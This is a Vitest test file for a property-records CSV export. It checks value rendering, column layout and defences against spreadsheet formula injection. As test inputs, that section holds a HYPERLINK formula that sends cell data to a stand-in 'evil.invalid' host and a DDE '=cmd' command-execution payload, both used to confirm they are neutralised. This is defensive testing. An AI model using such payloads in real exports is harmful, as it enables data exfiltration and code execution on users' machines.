import Papa from 'papaparse';
import { describe, expect, it } from 'vitest';
import { TRACERFY } from '@/lib/constants';
import { BLANK_OWNER_SKIP_REASON, BLANK_OWNER_SKIP_STATUS } from '@/lib/trace/blankOwnerSkip';
import {
  buildExportCsv,
  DOSSIER_COLUMN_PREFIX,
  DOSSIER_EXPORT_COLUMNS,
  EMAIL_COLUMN_COUNT,
  EXPORT_COLUMNS,
  PHONE_COLUMN_COUNT,
  renderCell,
  toExportCells,
  ZERO_MEANS_ABSENT_KEYS,
} from '@/lib/trace/exportCsv';
import { DOSSIER_EXPORT_KEYS } from '@/lib/trace/publicPropertyRecord';
import { OWNER_NAME_NOT_MATCHED_REASON } from '@/lib/trace/tier1Outcome';
import entityHitAddress from '@/lib/tracerfy/__tests__/fixtures/entity-hit-address.json';
import type { TraceHistory } from '@/types';

/**
 * The export is where a customer finds out what they bought, and it is the copy
 * that lands in their own system and outlives anything we could say on a screen.
 * Two things are tested here: that every value is rendered honestly, and that
 * the column set is the one fixed thing it claims to be.
 */

const FIXTURE = (entityHitAddress as { response: { property: Record<string, unknown> } })
  .response.property;

const row = (over: Partial<TraceHistory> = {}) =>
  ({
    normalized_address: '100 MAIN ST',
    city: 'DALLAS',
    state: 'TX',
    zip: '75001',
    input_owner_name: 'John Smith',
    status: 'success',
    trace_result: null,
    ai_research: null,
    ai_research_status: null,
    property_record: null,
    charge: 0.25,
    ...over,
  }) as unknown as TraceHistory;

/**
 * The 103 rendered cells of one row, addressed by column name.
 *
 * This used to resolve DUPLICATE names last-wins, which quietly made `state` and
 * the research `property_type` unreachable and therefore unasserted -- both
 * survived being replaced with `null` in a mutation run. Every column name is
 * unique now (that is what the `prop_` prefix bought), and the test below holds
 * it that way, so a lookup here cannot silently miss again.
 */
function cells(r: TraceHistory): Record<string, string> {
  const rendered = toExportCells(r);
  const out: Record<string, string> = {};
  EXPORT_COLUMNS.forEach((name, i) => {
    out[name] = rendered[i];
  });
  return out;
}

describe('renderCell', () => {
  it('renders an absence as blank, never as a value', () => {
    expect(renderCell(null)).toBe('');
    expect(renderCell(undefined)).toBe('');
    expect(renderCell('')).toBe('');
  });

  it('renders a known negative as No rather than blanking it into an unknown', () => {
    // MUTATION: return '' for false and this goes red. `flood_zone: false` is a
    // fact the county published; blank would say we do not know.
    expect(renderCell(true)).toBe('"Yes"');
    expect(renderCell(false)).toBe('"No"');
  });

  it('renders numbers bare, with no quotes and no thousands separators', () => {
    expect(renderCell(1957)).toBe('1957');
    expect(renderCell(2799600)).toBe('2799600');
    expect(renderCell(-5)).toBe('-5');
    expect(renderCell(64.43)).toBe('64.43');
    expect(renderCell(-111.88758804199307)).toBe('-111.88758804199307');
  });

  it('quotes strings and doubles an inner quote', () => {
    expect(renderCell('ACME LLC')).toBe('"ACME LLC"');
    expect(renderCell('The "Big" Barn')).toBe('"The ""Big"" Barn"');
  });

  it('keeps a comma or a newline inside one cell', () => {
    expect(renderCell('Smith, John')).toBe('"Smith, John"');
    expect(renderCell('line one\nline two')).toBe('"line one\nline two"');
  });

  it('does not blank the string "0", which is not the number 0', () => {
    expect(renderCell('0')).toBe('"0"');
  });
});

describe('a numeric zero', () => {
  it('renders as 0 by default, because 0 is usually the answer', () => {
    // MUTATION: go back to blanking every 0 and this goes red. The general rule
    // was wrong: it came from a MEASUREMENT convention for fill rates, not from
    // a rendering decision, and it destroyed real facts.
    expect(renderCell(0)).toBe('0');
    expect(renderCell(-0)).toBe('0');
  });

  it('is blanked only where 0 is impossible as a real value', () => {
    expect(renderCell(0, true)).toBe('');
  });

  it('survives on the commercial fields where it is genuinely zero', () => {
    // This product's market IS commercial stock, which is exactly where the old
    // blanket rule did its damage.
    const c = cells(
      row({
        property_record: {
          beds: 0,
          baths: 0,
          units_count: 0,
          stories: 0,
          years_owned: 0,
          mls_days_on_market: 0,
        },
      })
    );
    expect(c.prop_beds).toBe('0'); // genuinely zero on a retail building
    expect(c.prop_baths).toBe('0');
    expect(c.prop_units_count).toBe('0');
    expect(c.prop_stories).toBe('0');
    expect(c.prop_years_owned).toBe('0'); // bought this year
    expect(c.prop_mls_days_on_market).toBe('0'); // listed today
  });

  it('is blanked on money, size, years and coordinates', () => {
    const c = cells(
      row({
        property_record: {
          assessed_value: 0,
          last_sale_price: 0,
          open_mortgage_balance: 0,
          building_size_sqft: 0,
          lot_size_sqft: 0,
          year_built: 0,
          tax_delinquent_year: 0,
          latitude: 0,
          longitude: 0,
        },
      })
    );
    // A parcel assessed at $0, a building of 0 sqft, the year 0, and a parcel in
    // the Gulf of Guinea are all the vendor's zero-fill, not the county's answer.
    expect(c.prop_assessed_value).toBe('');
    expect(c.prop_last_sale_price).toBe('');
    expect(c.prop_open_mortgage_balance).toBe('');
    expect(c.prop_building_size_sqft).toBe('');
    expect(c.prop_lot_size_sqft).toBe('');
    expect(c.prop_year_built).toBe('');
    expect(c.prop_tax_delinquent_year).toBe('');
    expect(c.prop_latitude).toBe('');
    expect(c.prop_longitude).toBe('');
  });

  it('names only keys the dossier actually has', () => {
    // A typo here would silently switch a column back to rendering its 0.
    const listed = new Set<string>(DOSSIER_EXPORT_KEYS);
    for (const key of ZERO_MEANS_ABSENT_KEYS) {
      expect(listed.has(key), `${key} is not a dossier key`).toBe(true);
    }
  });

  it('leaves a nonzero value alone in both modes', () => {
    expect(renderCell(1957, true)).toBe('1957');
    expect(renderCell(0.5, true)).toBe('0.5');
  });
});

describe('a value that is not a scalar', () => {
  it('blanks an object rather than writing [object Object] into a cell', () => {
    // MUTATION: fall back to String(value) and this goes red. "[object Object]"
    // is not a value any county published. CLAUDE.md rule 7.
    expect(renderCell({ a: 1 })).toBe('');
    expect(renderCell({})).toBe('');
  });

  it('joins an array with the same separator relatives already used', () => {
    expect(renderCell(['A Doe', 'B Doe'])).toBe('"A Doe; B Doe"');
    expect(renderCell([1, 2, 3])).toBe('"1; 2; 3"');
    expect(renderCell([])).toBe('');
  });

  it('drops the members of an array that a cell cannot honestly hold', () => {
    expect(renderCell(['A Doe', { name: 'x' }, 'B Doe'])).toBe('"A Doe; B Doe"');
    expect(renderCell([{ name: 'x' }])).toBe('');
  });

  it('blanks a number that is not finite', () => {
    // NaN and Infinity are arithmetic that went wrong upstream, not facts.
    expect(renderCell(NaN)).toBe('');
    expect(renderCell(Infinity)).toBe('');
    expect(renderCell(-Infinity)).toBe('');
  });
});

describe('a value a spreadsheet would run as a formula', () => {
  /**
   * CSV quoting is not a security boundary. `"=1+1"` is correctly quoted and
   * Excel, Sheets and LibreOffice all strip the quotes and evaluate it. 65 of
   * the 103 columns now carry vendor-controlled free text.
   */
  it('defuses every leading trigger character', () => {
    // MUTATION: drop the leading-apostrophe guard and every one of these goes red.
    expect(renderCell('=1+1')).toBe(`"'=1+1"`);
    expect(renderCell('+1')).toBe(`"'+1"`);
    expect(renderCell('-1+1')).toBe(`"'-1+1"`);
    expect(renderCell('@SUM(A1)')).toBe(`"'@SUM(A1)"`);
    expect(renderCell('\tX')).toBe(`"'\tX"`);
    expect(renderCell('\rX')).toBe(`"'\rX"`);
  });

  it('defuses the forms that actually exfiltrate, not just arithmetic', () => {
    expect(renderCell('=HYPERLINK("http://evil.invalid?x="&A1,"click")')).toContain(`"'=HYPERLINK`);
    expect(renderCell('=cmd|\' /C calc\'!A0')).toContain(`"'=cmd`);
  });

  it('leaves a trigger character alone anywhere but the front', () => {
    // A trigger in the middle of a value is inert, and guarding it would corrupt
    // real data.
    expect(renderCell('SUITE A-1')).toBe('"SUITE A-1"');
    expect(renderCell('a=b')).toBe('"a=b"');
  });

  it('does not defuse a negative NUMBER, which is not text', () => {
    expect(renderCell(-111.887)).toBe('-111.887');
  });

  it('guards vendor free text arriving through a real dossier column', () => {
    const c = cells(row({ property_record: { lender_name: '=1+1', subdivision: '@X' } }));
    expect(c.prop_lender_name).toBe(`"'=1+1"`);
    expect(c.prop_subdivision).toBe(`"'@X"`);
  });

  it('is still readable by a parser, with the value visibly intact', () => {
    // The apostrophe is consumed by a SPREADSHEET, not by a CSV parser, so the
    // value is altered visibly rather than silently.
    const csv = buildExportCsv([row({ property_record: { lender_name: '=1+1' } })]);
    const parsed = Papa.parse<string[]>(csv, { skipEmptyLines: true });
    expect(parsed.errors).toEqual([]);
    expect(parsed.data[1][EXPORT_COLUMNS.indexOf('prop_lender_name')]).toBe(`'=1+1`);
  });
});

describe('the column set', () => {
  it('is 103 columns and the first 16 are exactly what they always were', () => {
    expect(EXPORT_COLUMNS).toHaveLength(103);
    expect(EXPORT_COLUMNS.slice(0, 16)).toEqual([
      'address',
      'city',
      'state',
      'zip',
      'owner_name',
      'status',
      'phone_1',
      'phone_2',
      'phone_3',
      'email_1',
      'email_2',
      'email_3',
      'mailing_address',
      'mailing_city',
      'mailing_state',
      'charge',
    ]);
  });

  it('has no duplicate name, so every column is addressable', () => {
    // MUTATION: drop the prop_ prefix and this goes red with 4 collisions.
    // Duplicates are not merely untidy: they made two columns unreachable by
    // name in our own tests and those columns went unasserted.
    expect(new Set(EXPORT_COLUMNS).size).toBe(EXPORT_COLUMNS.length);
  });

  it('prefixes all 65 dossier columns and keeps vendor order', () => {
    expect(DOSSIER_EXPORT_COLUMNS).toHaveLength(65);
    expect(DOSSIER_EXPORT_COLUMNS).toEqual(
      DOSSIER_EXPORT_KEYS.map((k) => `${DOSSIER_COLUMN_PREFIX}${k}`)
    );
    expect(DOSSIER_EXPORT_COLUMNS.every((c) => c.startsWith('prop_'))).toBe(true);
    expect(EXPORT_COLUMNS.slice(38)).toEqual(DOSSIER_EXPORT_COLUMNS);
  });

  it('keeps the research block at the indices it already occupied', () => {
    // These were columns 17-20 of every job that had research, which is 40 of
    // the 44 that carry rows. Moving them is a reorder, not an append, and it
    // breaks an importer keyed on position.
    expect(EXPORT_COLUMNS.slice(16, 20)).toEqual([
      'owner_type',
      'deceased',
      'relatives',
      'property_type',
    ]);
  });

  it('appends skip_reason after the research block, not before it', () => {
    // Measured: ZERO existing jobs carry skip_reason, so putting it at 21 is a
    // pure append. Putting it at 17 would shove the research block right.
    expect(EXPORT_COLUMNS[20]).toBe('skip_reason');
  });

  it('carries a column for every phone and email the vendor cap allows', () => {
    // MUTATION: raise TRACERFY.MAX_PHONES to 9 and this goes red, so the 9th
    // phone gets a column deliberately instead of being silently unexported.
    expect(PHONE_COLUMN_COUNT).toBe(TRACERFY.MAX_PHONES);
    expect(EMAIL_COLUMN_COUNT).toBe(TRACERFY.MAX_EMAILS);
    expect(EXPORT_COLUMNS.filter((c) => /^phone_\d+$/.test(c))).toHaveLength(TRACERFY.MAX_PHONES);
    expect(EXPORT_COLUMNS.filter((c) => /^phone_\d+_type$/.test(c))).toHaveLength(
      TRACERFY.MAX_PHONES
    );
    expect(EXPORT_COLUMNS.filter((c) => /^email_\d+$/.test(c))).toHaveLength(TRACERFY.MAX_EMAILS);
  });
});

describe('the base columns', () => {
  /**
   * THESE WERE THE UNASSERTED ONES. `state` and the research `property_type`
   * collided with a dossier name, the lookup helper resolved last-wins, and both
   * survived being replaced with `null` in a mutation run. Asserted now.
   */
  it('carries the address the customer submitted, field by field', () => {
    // MUTATION: replace row.state with null in toExportValues and this goes red.
    const c = cells(row());
    expect(c.address).toBe('"100 MAIN ST"');
    expect(c.city).toBe('"DALLAS"');
    expect(c.state).toBe('"TX"');
    expect(c.zip).toBe('"75001"');
    expect(c.status).toBe('"success"');
  });

  it('keeps the submitted address distinct from the county address of record', () => {
    // The two really are different facts, which is why one name for both was
    // wrong. The county spells it differently and may disagree outright.
    const c = cells(row({ property_record: FIXTURE }));
    expect(c.state).toBe('"TX"'); // what the customer sent
    expect(c.prop_state).toBe('"UT"'); // what the county has
    expect(c.address).toBe('"100 MAIN ST"');
    expect(c.prop_address).toBe('"1815 S State St"');
  });

  it('falls back to the submitted owner name when no person was resolved', () => {
    expect(cells(row()).owner_name).toBe('"John Smith"');
  });

  it('renders charge bare and to two decimals, so the column can be summed', () => {
    // MUTATION: quote it and this goes red. It is money, and a column of quoted
    // "0.40" cannot be summed in a spreadsheet without a conversion step.
    expect(cells(row({ charge: 0.4 })).charge).toBe('0.40');
    expect(cells(row({ charge: 0 })).charge).toBe('0.00');
    expect(cells(row({ charge: 0.25 })).charge).toBe('0.25');
  });
});

describe('a traced row', () => {
  const traced = row({
    trace_result: {
      owner_name: 'Jane Doe',
      owner_name_2: 'Colmaven, Llc',
      phones: [
        { number: '5125550101', type: 'mobile' },
        { number: '5125550102', type: 'landline' },
        { number: '5125550103', type: 'voip' },
        { number: '5125550104', type: 'mobile' },
        { number: '5125550105', type: 'mobile' },
        { number: '5125550106', type: 'landline' },
        { number: '5125550107', type: 'unknown' },
        { number: '5125550108', type: 'mobile' },
      ],
      emails: ['a@x.invalid', 'b@x.invalid', 'c@x.invalid', 'd@x.invalid', 'e@x.invalid'],
      mailing_address: '1 PO BOX',
      mailing_city: 'AUSTIN',
      mailing_state: 'TX',
      mailing_zip: '78701',
      match_confidence: 91,
    },
  });

  it('exports every phone bought, not only the first three', () => {
    // 863 of 1,362 live rows hold more than 3 phones. 1,554 numbers were bought
    // and never exported.
    const c = cells(traced);
    for (let i = 1; i <= 8; i++) {
      expect(c[`phone_${i}`]).toBe(`"512555010${i}"`);
    }
  });

  it('exports the type of every phone, so a mobile is tellable from a landline', () => {
    const c = cells(traced);
    expect(c.phone_1_type).toBe('"mobile"');
    expect(c.phone_2_type).toBe('"landline"');
    expect(c.phone_3_type).toBe('"voip"');
    expect(c.phone_7_type).toBe('"unknown"');
  });

  it('exports all five emails, the mailing address and the mailing zip', () => {
    const c = cells(traced);
    expect(c.email_1).toBe('"a@x.invalid"');
    expect(c.email_4).toBe('"d@x.invalid"');
    expect(c.email_5).toBe('"e@x.invalid"');
    expect(c.mailing_address).toBe('"1 PO BOX"');
    expect(c.mailing_city).toBe('"AUSTIN"');
    expect(c.mailing_state).toBe('"TX"');
    expect(c.mailing_zip).toBe('"78701"');
  });

  it('exports the owner of record, which had no column at all', () => {
    // THE WORST OUTCOME THIS FIXES. `owner_name` is the resolved PERSON; the
    // entity the county has on file lived only in owner_name_2 and was never
    // exported, so a tier 2 customer never saw "Colmaven, Llc" even on a hit.
    expect(cells(traced).owner_of_record).toBe('"Colmaven, Llc"');
    expect(cells(traced).owner_name).toBe('"Jane Doe"');
  });

  it('leaves the contact columns blank when nothing came back', () => {
    const c = cells(row());
    expect(c.phone_1).toBe('');
    expect(c.phone_8).toBe('');
    expect(c.phone_1_type).toBe('');
    expect(c.email_5).toBe('');
    expect(c.owner_of_record).toBe('');
    expect(c.mailing_zip).toBe('');
  });
});

describe('a row carrying the county dossier', () => {
  const c = cells(row({ property_record: FIXTURE }));

  it('exports the county facts the tier 2 charge bought', () => {
    expect(c.prop_county).toBe('"Salt Lake County"');
    expect(c.prop_apn).toBe('"16-18-306-029"');
    expect(c.prop_year_built).toBe('1957');
    expect(c.prop_building_size_sqft).toBe('36037');
    expect(c.prop_assessed_value).toBe('2799600');
    expect(c.prop_latitude).toBe('40.73093152971248');
    expect(c.prop_property_use).toBe('"Retail Stores (Personal Services, Photography, Travel)"');
  });

  it('renders a false county flag as No and a true one as Yes', () => {
    expect(c.prop_has_pool).toBe('"No"');
    expect(c.prop_flood_zone).toBe('"Yes"');
    expect(c.prop_absentee_owner).toBe('"Yes"');
    expect(c.prop_owner_occupied).toBe('"No"');
  });

  it('blanks a zero-filled absence on the impossible-zero keys', () => {
    // last_sale_price and price_per_sqft are both 0 on this parcel. A parcel
    // does not sell for $0; there was no sale price on record.
    expect(c.prop_last_sale_price).toBe('');
    expect(c.prop_price_per_sqft).toBe('');
    expect(c.prop_open_mortgage_balance).toBe('');
  });

  it('blanks a key the county never published rather than inventing one', () => {
    expect(c.prop_beds).toBe('');
    expect(c.prop_subdivision).toBe('');
    expect(c.prop_mls_days_on_market).toBe('');
    expect(c.prop_lender_name).toBe('');
  });

  it('leaves all 65 dossier columns blank on a row with no record', () => {
    const empty = cells(row());
    for (const column of DOSSIER_EXPORT_COLUMNS) {
      expect(empty[column], column).toBe('');
    }
  });
});

describe('the file itself', () => {
  it('is the header plus one line per row', () => {
    const csv = buildExportCsv([row(), row()]);
    const lines = csv.split('\n');
    expect(lines).toHaveLength(3);
    expect(lines[0]).toBe(EXPORT_COLUMNS.join(','));
    expect(lines[1].split(',')).toHaveLength(103);
  });

  it('is the header alone when a job has no rows', () => {
    expect(buildExportCsv([])).toBe(EXPORT_COLUMNS.join(','));
  });

  it('says a skipped row cost nothing, in money and in words', () => {
    const c = cells(
      row({
        input_owner_name: null,
        status: 'no_match',
        ai_research_status: BLANK_OWNER_SKIP_STATUS,
        charge: 0,
      })
    );
    // Zero charge is NOT an absence. It is the statement that the row was free,
    // and it is the only thing a skipped row has to say about money.
    expect(c.charge).toBe('0.00');
    expect(c.skip_reason).toBe(`"${BLANK_OWNER_SKIP_REASON}"`);
    expect(c.owner_name).toBe('');
  });

  it('explains a TIER 2 row too, which the column was blank for until 5c-3B', () => {
    // The cell read skipReasonFor(), the tier 1 accessor, on its own, so every
    // terminal value on the property-trace queue produced an empty cell next to
    // a bare no_match. MUTATION: point the cell back at skipReasonFor and this
    // goes red.
    const c = cells(
      row({
        input_owner_name: null,
        status: 'no_match',
        ai_research_status: null,
        property_trace_status: 'property_trace_no_key',
        charge: 0,
      })
    );
    expect(c.skip_reason).toContain('missing the street, city or state');
    expect(c.charge).toBe('0.00');
  });

  it('tells a BILLED tier 2 row it was charged, beside a charge the file can be summed on', () => {
    // The row whose property record was bought before the contact vendor failed.
    // The money column and the sentence have to agree: a non-zero charge next to
    // a cell saying "you were not charged" is the contradiction this status was
    // created to prevent.
    const c = cells(
      row({
        input_owner_name: null,
        status: 'no_match',
        ai_research_status: null,
        property_trace_status: 'property_trace_no_reach',
        charge: 0.4,
      })
    );
    expect(c.skip_reason).toContain('could not reach the service that looks up contacts');
    expect(c.skip_reason).toContain('You were charged for it');
    expect(c.skip_reason).not.toContain('not charged');
    expect(c.charge).toBe('0.40');
  });

  it('carries a single trace Tier 1 sentence in the existing skip_reason column', () => {
    // trace_job_id: null marks this as a row a single trace itself wrote (spec D33); a bulk
    // row that reused this row would carry a real trace_job_id and get no Tier 1 sentence.
    const c = cells(row({ outcome_code: 'owner_name_not_matched', is_successful: false, trace_job_id: null }));
    expect(c.skip_reason).toBe(`"${OWNER_NAME_NOT_MATCHED_REASON}"`);
  });

  it('never shows the Tier 1 sentence on a bulk row that reused a single trace row (spec D33)', () => {
    // MUTATION: drop the `row.trace_job_id === null` condition in rowSkipReason and this goes red.
    const c = cells(
      row({
        outcome_code: 'owner_name_not_matched',
        is_successful: false,
        trace_job_id: 'job-1',
        property_trace_status: 'property_trace_done',
        charge: 0.4,
      })
    );
    expect(c.skip_reason).toBe('');
  });

  it('emits skip_reason and the research block on every job, blank when unused', () => {
    // Both conditionals are gone. A header that depends on the rows is a header
    // that changes shape between two downloads of the same product.
    const csv = buildExportCsv([row()]);
    expect(csv.split('\n')[0]).toContain('skip_reason');
    expect(csv.split('\n')[0]).toContain('relatives');
    const c = cells(row());
    expect(c.skip_reason).toBe('');
    expect(c.relatives).toBe('');
    expect(c.deceased).toBe('');
  });

  it('carries the historical research a customer already paid for', () => {
    // MUTATION: replace research?.property_type with null and this goes red. It
    // could not before: `property_type` collided with the dossier key and the
    // lookup resolved to the wrong column.
    const c = cells(
      row({
        ai_research: {
          owner_name: 'Jane Doe',
          owner_type: 'business',
          business_name: null,
          individual_behind_business: null,
          is_deceased: false,
          deceased_details: null,
          relatives: ['A Doe', 'B Doe'],
          decision_makers: [],
          property_type: 'commercial',
          confidence: 80,
          confidence_reasoning: null,
          sources: [],
        },
      })
    );
    expect(c.owner_type).toBe('"business"');
    expect(c.deceased).toBe('"No"');
    expect(c.relatives).toBe('"A Doe; B Doe"');
    expect(c.property_type).toBe('"commercial"');
  });

  it('keeps the research property_type distinct from the county one', () => {
    const c = cells(
      row({
        ai_research: { property_type: 'commercial', relatives: [] } as never,
        property_record: FIXTURE,
      })
    );
    expect(c.property_type).toBe('"commercial"');
    expect(c.prop_property_type).toBe('"Retail Stores (Personal Servic"');
  });

  it('keeps a comma in an address inside one cell', () => {
    const csv = buildExportCsv([row({ normalized_address: '100 MAIN ST, APT 2' })]);
    expect(csv.split('\n')[1].startsWith('"100 MAIN ST, APT 2",')).toBe(true);
  });

  it('survives a real parser with a comma, a quote and a newline in the data', () => {
    // The file only has to hold together in SOMEBODY ELSE'S parser. Asserted
    // against one rather than against our own escaping, because our escaping
    // agreeing with itself proves nothing.
    const csv = buildExportCsv([
      row({
        normalized_address: '100 MAIN ST, APT 2',
        city: 'THE "BIG" CITY',
        input_owner_name: 'Line one\nLine two',
        trace_result: null,
      }),
      row({ normalized_address: '200 OAK AVE' }),
    ]);
    const parsed = Papa.parse<string[]>(csv, { skipEmptyLines: true });

    expect(parsed.errors).toEqual([]);
    expect(parsed.data).toHaveLength(3);
    expect(parsed.data[0]).toEqual([...EXPORT_COLUMNS]);
    expect(parsed.data[1]).toHaveLength(103);
    expect(parsed.data[1][0]).toBe('100 MAIN ST, APT 2');
    expect(parsed.data[1][1]).toBe('THE "BIG" CITY');
    expect(parsed.data[1][4]).toBe('Line one\nLine two');
    expect(parsed.data[2][0]).toBe('200 OAK AVE');
  });
});
